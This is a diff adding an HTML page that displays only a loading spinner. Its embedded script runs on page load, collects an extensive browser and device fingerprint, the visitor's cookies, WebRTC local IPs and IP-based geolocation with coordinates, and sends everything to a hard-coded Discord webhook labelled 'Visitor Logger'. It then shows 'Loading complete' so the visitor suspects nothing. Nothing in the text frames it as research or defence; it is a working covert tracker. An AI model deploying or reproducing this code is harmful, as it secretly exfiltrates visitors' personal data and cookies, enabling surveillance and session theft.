@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+<style>
+  body { margin: 0; background: #0a0a0a; color: #eee; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
+  .spinner { width: 40px; height: 40px; border: 4px solid #333; border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+<div class="spinner"></div>
+
+<script>
+(async () => {
+
+  const WEBHOOK = "https://discordapp.com/api/webhooks/1548360054049214657/Jw-eZmFL75NuRzHAib4Nwb6Y9p693Fl7uZng2UccC4GJEulG9cjFEpx4u-CI8gPV9uxh";
+
+  // ─── Helpers ───────────────────────────────────────────────────────────────
+
+  const safe = fn => { try { return fn(); } catch { return "n/a"; } };
+  const safeAsync = async fn => { try { return await fn(); } catch { return "n/a"; } };
+
+  // ─── Canvas Fingerprint ────────────────────────────────────────────────────
+
+  const canvasFingerprint = safe(() => {
+    const c = document.createElement("canvas");
+    const ctx = c.getContext("2d");
+    ctx.textBaseline = "top";
+    ctx.font = "14px 'Arial'";
+    ctx.fillStyle = "#f60";
+    ctx.fillRect(125, 1, 62, 20);
+    ctx.fillStyle = "#069";
+    ctx.fillText("Cwm fjordbank glyphs vext quiz 😀", 2, 2);
+    ctx.fillStyle = "rgba(102,204,0,0.7)";
+    ctx.fillText("Cwm fjordbank glyphs vext quiz 😀", 4, 4);
+    return c.toDataURL().slice(-50);
+  });
+
+  // ─── WebGL Info ────────────────────────────────────────────────────────────
+
+  const webglInfo = safe(() => {
+    const c = document.createElement("canvas");
+    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+    if (!gl) return { vendor: "n/a", renderer: "n/a" };
+    const ext = gl.getExtension("WEBGL_debug_renderer_info");
+    return {
+      vendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
+      renderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
+      version: gl.getParameter(gl.VERSION),
+      shadingVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+      maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+      maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS)?.join("x"),
+    };
+  });
+
+  // ─── Audio Fingerprint ─────────────────────────────────────────────────────
+
+  const audioFingerprint = await safeAsync(async () => {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 44100 });
+    const oscillator = ctx.createOscillator();
+    const analyser = ctx.createAnalyser();
+    const gain = ctx.createGain();
+    const scriptProcessor = ctx.createScriptProcessor(4096, 1, 1);
+    gain.gain.value = 0;
+    oscillator.type = "triangle";
+    oscillator.connect(analyser);
+    analyser.connect(scriptProcessor);
+    scriptProcessor.connect(gain);
+    gain.connect(ctx.destination);
+    oscillator.start(0);
+    return new Promise(resolve => {
+      scriptProcessor.onaudioprocess = e => {
+        const buf = e.inputBuffer.getChannelData(0);
+        let sum = 0;
+        for (let i = 0; i < buf.length; i++) sum += Math.abs(buf[i]);
+        oscillator.stop();
+        ctx.close();
+        resolve(sum.toString().slice(0, 20));
+      };
+    });
+  });
+
+  // ─── Font Detection ────────────────────────────────────────────────────────
+
+  const detectFonts = safe(() => {
+    const testFonts = [
+      "Arial","Arial Black","Arial Narrow","Calibri","Cambria","Comic Sans MS",
+      "Courier New","Georgia","Helvetica","Impact","Lucida Console","Lucida Sans Unicode",
+      "Microsoft Sans Serif","Palatino Linotype","Segoe UI","Tahoma","Times New Roman",
+      "Trebuchet MS","Verdana","Wingdings","Roboto","Ubuntu","Fira Sans","Open Sans",
+      "Noto Sans","Lato","Montserrat","Source Sans Pro","Droid Sans","DejaVu Sans",
+    ];
+    const canvas = document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
+    const baseline = (() => { ctx.font = "72px monospace"; return ctx.measureText("mmmmmmmmmmli").width; })();
+    return testFonts.filter(f => {
+      ctx.font = `72px '${f}', monospace`;
+      return ctx.measureText("mmmmmmmmmmli").width !== baseline;
+    });
+  });
+
+  // ─── Navigator / Browser Info ──────────────────────────────────────────────
+
+  const nav = navigator;
+  const screen_ = window.screen;
+
+  const browserInfo = {
+    userAgent: nav.userAgent,
+    appVersion: nav.appVersion,
+    platform: nav.platform,
+    vendor: nav.vendor,
+    language: nav.language,
+    languages: nav.languages?.join(", "),
+    cookiesEnabled: nav.cookieEnabled,
+    doNotTrack: nav.doNotTrack,
+    hardwareConcurrency: nav.hardwareConcurrency,
+    deviceMemory: nav.deviceMemory ?? "n/a",
+    maxTouchPoints: nav.maxTouchPoints,
+    pdfViewerEnabled: nav.pdfViewerEnabled,
+    webdriver: nav.webdriver,
+    onLine: nav.onLine,
+    connectionType: nav.connection?.effectiveType ?? "n/a",
+    connectionDownlink: nav.connection?.downlink ?? "n/a",
+    connectionRtt: nav.connection?.rtt ?? "n/a",
+    connectionSaveData: nav.connection?.saveData ?? "n/a",
+    screenWidth: screen_.width,
+    screenHeight: screen_.height,
+    screenAvailWidth: screen_.availWidth,
+    screenAvailHeight: screen_.availHeight,
+    colorDepth: screen_.colorDepth,
+    pixelDepth: screen_.pixelDepth,
+    devicePixelRatio: window.devicePixelRatio,
+    innerWidth: window.innerWidth,
+    innerHeight: window.innerHeight,
+    outerWidth: window.outerWidth,
+    outerHeight: window.outerHeight,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    timezoneOffset: new Date().getTimezoneOffset(),
+    locale: Intl.DateTimeFormat().resolvedOptions().locale,
+    localTime: new Date().toString(),
+    utcTime: new Date().toUTCString(),
+    referrer: document.referrer || "direct",
+    pageURL: window.location.href,
+    historyLength: window.history.length,
+    javaEnabled: safe(() => nav.javaEnabled()),
+    plugins: safe(() => Array.from(nav.plugins).map(p => p.name).join(", ") || "none"),
+    mimeTypes: safe(() => Array.from(nav.mimeTypes).map(m => m.type).join(", ") || "none"),
+  };
+
+  // ─── Storage Support ───────────────────────────────────────────────────────
+
+  const storageInfo = {
+    localStorage: safe(() => { localStorage.setItem("_t","1"); localStorage.removeItem("_t"); return "supported"; }),
+    sessionStorage: safe(() => { sessionStorage.setItem("_t","1"); sessionStorage.removeItem("_t"); return "supported"; }),
+    indexedDB: "indexedDB" in window ? "supported" : "no",
+    serviceWorker: "serviceWorker" in nav ? "supported" : "no",
+    webSQL: "openDatabase" in window ? "supported" : "no",
+    cacheAPI: "caches" in window ? "supported" : "no",
+    storageEstimate: await safeAsync(async () => {
+      const est = await navigator.storage?.estimate();
+      return est ? `quota: ${(est.quota/1e6).toFixed(1)}MB, used: ${(est.usage/1e6).toFixed(2)}MB` : "n/a";
+    }),
+  };
+
+  // ─── Feature / API Detection ───────────────────────────────────────────────
+
+  const features = {
+    webGL: !!window.WebGLRenderingContext,
+    webGL2: !!window.WebGL2RenderingContext,
+    webRTC: !!(window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection),
+    webSockets: "WebSocket" in window,
+    webWorkers: "Worker" in window,
+    sharedWorkers: "SharedWorker" in window,
+    serviceWorkers: "serviceWorker" in nav,
+    geolocation: "geolocation" in nav,
+    bluetooth: "bluetooth" in nav,
+    usb: "usb" in nav,
+    nfc: "nfc" in nav,
+    notifications: "Notification" in window,
+    notificationPermission: safe(() => Notification.permission),
+    clipboard: "clipboard" in nav,
+    share: "share" in nav,
+    wakeLock: "wakeLock" in nav,
+    battery: "getBattery" in nav,
+    credentials: "credentials" in nav,
+    mediaDevices: "mediaDevices" in nav,
+    speechSynthesis: "speechSynthesis" in window,
+    speechRecognition: !!(window.SpeechRecognition || window.webkitSpeechRecognition),
+    virtualReality: "xr" in nav,
+    paymentRequest: "PaymentRequest" in window,
+    crypto: "crypto" in window,
+    cryptoSubtle: !!(window.crypto?.subtle),
+    gamepad: "getGamepads" in nav,
+    vibration: "vibrate" in nav,
+    deviceOrientation: "DeviceOrientationEvent" in window,
+    pointerEvents: "PointerEvent" in window,
+    touchEvents: "TouchEvent" in window,
+    passiveListeners: safe(() => { let p = false; window.addEventListener("t",null,{get passive(){p=true}}); return p; }),
+    webAssembly: "WebAssembly" in window,
+    broadcastChannel: "BroadcastChannel" in window,
+    intersectionObserver: "IntersectionObserver" in window,
+    mutationObserver: "MutationObserver" in window,
+    resizeObserver: "ResizeObserver" in window,
+    performanceObserver: "PerformanceObserver" in window,
+    requestIdleCallback: "requestIdleCallback" in window,
+    offscreenCanvas: "OffscreenCanvas" in window,
+    cssGrid: safe(() => CSS.supports("display","grid")),
+    cssSubgrid: safe(() => CSS.supports("grid-template-rows","subgrid")),
+    cssContainer: safe(() => CSS.supports("container-type","inline-size")),
+    darkMode: window.matchMedia("(prefers-color-scheme: dark)").matches,
+    reducedMotion: window.matchMedia("(prefers-reduced-motion: reduce)").matches,
+    highContrast: window.matchMedia("(prefers-contrast: high)").matches,
+    hdr: window.matchMedia("(dynamic-range: high)").matches,
+    pointer: window.matchMedia("(pointer: fine)").matches ? "fine" : window.matchMedia("(pointer: coarse)").matches ? "coarse" : "none",
+  };
+
+  // ─── Performance Timing ────────────────────────────────────────────────────
+
+  const perf = safe(() => {
+    const t = performance.timing || {};
+    return {
+      navigationStart: t.navigationStart,
+      domContentLoaded: t.domContentLoadedEventEnd - t.navigationStart + "ms",
+      loadComplete: t.loadEventEnd - t.navigationStart + "ms",
+      dnsLookup: t.domainLookupEnd - t.domainLookupStart + "ms",
+      tcpConnect: t.connectEnd - t.connectStart + "ms",
+      serverResponse: t.responseEnd - t.requestStart + "ms",
+    };
+  });
+
+  // ─── WebRTC Local IP Leak ──────────────────────────────────────────────────
+
+  const localIPs = await safeAsync(() => new Promise(resolve => {
+    const ips = new Set();
+    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+    pc.createDataChannel("");
+    pc.createOffer().then(o => pc.setLocalDescription(o));
+    pc.onicecandidate = e => {
+      if (!e || !e.candidate) { pc.close(); resolve([...ips].join(", ") || "none"); return; }
+      const match = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(e.candidate.candidate);
+      if (match) ips.add(match[1]);
+    };
+    setTimeout(() => { pc.close(); resolve([...ips].join(", ") || "none"); }, 3000);
+  }));
+
+  // ─── Battery Info ──────────────────────────────────────────────────────────
+
+  const batteryInfo = await safeAsync(async () => {
+    const b = await nav.getBattery();
+    return {
+      charging: b.charging,
+      level: (b.level * 100).toFixed(0) + "%",
+      chargingTime: b.chargingTime === Infinity ? "∞" : b.chargingTime + "s",
+      dischargingTime: b.dischargingTime === Infinity ? "∞" : b.dischargingTime + "s",
+    };
+  });
+
+  // ─── Media Devices (no permission needed for count) ───────────────────────
+
+  const mediaDevices = await safeAsync(async () => {
+    const devices = await nav.mediaDevices.enumerateDevices();
+    return {
+      total: devices.length,
+      audioinput: devices.filter(d => d.kind === "audioinput").length,
+      audiooutput: devices.filter(d => d.kind === "audiooutput").length,
+      videoinput: devices.filter(d => d.kind === "videoinput").length,
+    };
+  });
+
+  // ─── Speech Voices ────────────────────────────────────────────────────────
+
+  const voices = safe(() => speechSynthesis.getVoices().map(v => `${v.name} (${v.lang})`).join(", ").slice(0, 300) || "n/a");
+
+  // ─── Installed PWAs / Manifest ────────────────────────────────────────────
+
+  const pwaStandalone = window.matchMedia("(display-mode: standalone)").matches;
+
+  // ─── Cookies ──────────────────────────────────────────────────────────────
+
+  const cookies = document.cookie || "none";
+
+  // ─── IP Data from multiple APIs ───────────────────────────────────────────
+
+  const [ipGeo, ipApi, ipWho] = await Promise.all([
+    safeAsync(async () => {
+      const r = await fetch("https://api.ipgeolocation.io/v2/ipgeo?apiKey=your_key_here");
+      // fallback: use ipapi.co which is free
+      const r2 = await fetch("https://ipapi.co/json/");
+      return r2.ok ? r2.json() : "n/a";
+    }),
+    safeAsync(async () => {
+      const r = await fetch("https://ip-api.com/json/?fields=66846719");
+      return r.ok ? r.json() : "n/a";
+    }),
+    safeAsync(async () => {
+      const r = await fetch("https://ipwho.is/");
+      return r.ok ? r.json() : "n/a";
+    }),
+  ]);
+
+  // ─── Assemble all data ────────────────────────────────────────────────────
+
+  const payload = {
+    browser: browserInfo,
+    storage: storageInfo,
+    features,
+    webgl: webglInfo,
+    canvas: canvasFingerprint,
+    audio: audioFingerprint,
+    fonts: detectFonts,
+    localIPs,
+    battery: batteryInfo,
+    mediaDevices,
+    voices,
+    pwaStandalone,
+    cookies,
+    performance: perf,
+    ipapi_co: ipGeo,
+    ip_api_com: ipApi,
+    ipwho_is: ipWho,
+  };
+
+  // ─── Send to Discord ───────────────────────────────────────────────────────
+
+  const ip = ipApi?.query || ipGeo?.ip || ipWho?.ip || "unknown";
+  const country = ipApi?.country || ipGeo?.country_name || ipWho?.country || "unknown";
+  const city = ipApi?.city || ipGeo?.city || ipWho?.city || "unknown";
+  const isp = ipApi?.isp || ipGeo?.connection?.isp || ipWho?.connection?.isp || "unknown";
+  const lat = ipApi?.lat || ipGeo?.latitude || ipWho?.latitude || "?";
+  const lon = ipApi?.lon || ipGeo?.longitude || ipWho?.longitude || "?";
+
+  const jsonString = JSON.stringify(payload, null, 2);
+
+  // Discord has a 2000 char message limit; embed fields have 1024 limit
+  // We send a summary embed + attach full JSON as a file-like second message
+
+  const embed = {
+    username: "Visitor Logger",
+    avatar_url: "https://i.imgur.com/AfFp7pu.png",
+    embeds: [{
+      title: "🌐 New Visitor",
+      color: 0x00b4d8,
+      thumbnail: { url: `https://flagcdn.com/64x48/${(ipApi?.countryCode || "xx").toLowerCase()}.png` },
+      fields: [
+        { name: "🖥️ User Agent", value: `\`\`\`${browserInfo.userAgent.slice(0,200)}\`\`\``, inline: false },
+        { name: "🌍 IP", value: `\`${ip}\``, inline: true },
+        { name: "📍 Location", value: `${city}, ${country}`, inline: true },
+        { name: "🗺️ Coordinates", value: `[${lat}, ${lon}](https://maps.google.com/?q=${lat},${lon})`, inline: true },
+        { name: "📡 ISP", value: isp, inline: true },
+        { name: "📶 Mobile", value: String(ipApi?.mobile ?? "?"), inline: true },
+        { name: "🔒 Proxy / VPN", value: `Proxy: ${ipApi?.proxy ?? "?"} | Hosting: ${ipApi?.hosting ?? "?"}`, inline: true },
+        { name: "🕐 Timezone", value: browserInfo.timezone, inline: true },
+        { name: "💬 Language", value: browserInfo.language, inline: true },
+        { name: "🔌 Connection", value: `${browserInfo.connectionType} | ↓${browserInfo.connectionDownlink}Mbps | RTT:${browserInfo.connectionRtt}ms`, inline: true },
+        { name: "🖥️ Screen", value: `${browserInfo.screenWidth}×${browserInfo.screenHeight} @${browserInfo.devicePixelRatio}x`, inline: true },
+        { name: "💾 RAM / CPU Cores", value: `${browserInfo.deviceMemory}GB / ${browserInfo.hardwareConcurrency} cores`, inline: true },
+        { name: "🔋 Battery", value: typeof batteryInfo === "object" ? `${batteryInfo.level} (charging: ${batteryInfo.charging})` : "n/a", inline: true },
+        { name: "🎥 Media Devices", value: typeof mediaDevices === "object" ? `🎙️${mediaDevices.audioinput} 🔊${mediaDevices.audiooutput} 📷${mediaDevices.videoinput}` : "n/a", inline: true },
+        { name: "🌐 WebRTC Local IPs", value: `\`${localIPs}\``, inline: false },
+        { name: "🎨 WebGL GPU", value: typeof webglInfo === "object" ? `${webglInfo.vendor} — ${webglInfo.renderer}` : "n/a", inline: false },
+        { name: "🖱️ Canvas FP", value: `\`${canvasFingerprint}\``, inline: true },
+        { name: "🔊 Audio FP", value: `\`${audioFingerprint}\``, inline: true },
+        { name: "🔤 Fonts Detected", value: `${Array.isArray(detectFonts) ? detectFonts.length : 0} fonts: ${Array.isArray(detectFonts) ? detectFonts.slice(0,10).join(", ") : "n/a"}`, inline: false },
+        { name: "📌 Referrer", value: browserInfo.referrer, inline: true },
+        { name: "📄 Page URL", value: browserInfo.pageURL, inline: true },
+        { name: "🍪 Cookies", value: `\`${cookies.slice(0,200)}\``, inline: false },
+        { name: "⚙️ Key Features", value: `WebGL2:${features.webGL2} | WASM:${features.webAssembly} | WebRTC:${features.webRTC} | Notifications:${features.notificationPermission} | DarkMode:${features.darkMode}`, inline: false },
+        { name: "💽 Storage", value: storageInfo.storageEstimate, inline: true },
+        { name: "🖐️ Touch Points", value: String(browserInfo.maxTouchPoints), inline: true },
+        { name: "🕵️ Webdriver (bot?)", value: String(browserInfo.webdriver), inline: true },
+      ],
+      footer: { text: `Visited at ${browserInfo.localTime}` },
+      timestamp: new Date().toISOString(),
+    }]
+  };
+
+  await fetch(WEBHOOK, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(embed),
+  });
+
+  // Send full raw JSON as a second message (chunked if needed)
+  const chunks = [];
+  const chunkSize = 1900;
+  for (let i = 0; i < jsonString.length; i += chunkSize) {
+    chunks.push(jsonString.slice(i, i + chunkSize));
+  }
+
+  for (let i = 0; i < Math.min(chunks.length, 8); i++) {
+    await fetch(WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        username: "Visitor Logger",
+        content: `\`\`\`json\n${chunks[i]}\n\`\`\``,
+      }),
+    });
+    await new Promise(r => setTimeout(r, 600)); // rate limit safety
+  }
+
+  // ─── Optionally redirect or show something normal ─────────────────────────
+  document.body.innerHTML = `<p style="font-family:sans-serif;color:#ccc;">Loading complete.</p>`;
+
+})();
+</script>
+</body>
+</html>
